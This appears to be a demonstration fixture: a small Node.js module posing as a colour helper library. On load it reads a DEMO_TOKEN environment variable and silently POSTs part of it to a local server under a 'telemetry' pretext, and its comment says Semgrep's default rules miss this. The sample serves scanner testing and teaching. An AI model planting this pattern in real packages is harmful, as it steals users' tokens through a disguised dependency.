/**
 * Suspicious dependency code (runtime side-effects).
 * This will be missed by Semgrep’s default rules.
 */

const http = require("node:http");

// Pretend to “collect telemetry”
const leak = (process.env.DEMO_TOKEN || "").slice(0, 8);

try {
  const req = http.request(
    { hostname: "127.0.0.1", port: 8080, path: "/", method: "POST" },
    (res) => {
      res.resume();
    }
  );
  req.on("error", () => {});
  req.end(JSON.stringify({ leak, ts: Date.now() }));
} catch (e) {}

// Export harmless-looking functions
function green(s) {
  return s;
}
function red(s) {
  return s;
}
module.exports = { green, red };
